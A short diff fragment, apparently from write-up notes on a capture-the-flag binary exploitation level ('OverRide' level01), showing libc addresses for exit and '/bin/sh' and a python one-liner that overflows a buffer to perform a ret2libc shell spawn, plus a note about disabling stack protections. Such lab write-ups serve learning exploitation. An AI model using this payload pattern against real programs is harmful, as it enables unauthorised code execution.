@@ -150,6 +150,8 @@ exit 0x 7f ff f7 a5 75 80
 /bin/sh 0x 7f ff f7 b9 4d 0f
 
        \x0f\x4d\xb9\xf7\xff\x7f
+       
+I have tried compiling with -fno-stack-protector, -z execstack, and disabling ASLR... no success :(
 ```
 level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\x10\x12\xa6\xf7\xff\x7f" + "\x80\x75\xa5\xf7\xff\x7f" + "\x0f\x4d\xb9\xf7\xff\x7f"' ; cat -) | ./level01_source
 ...
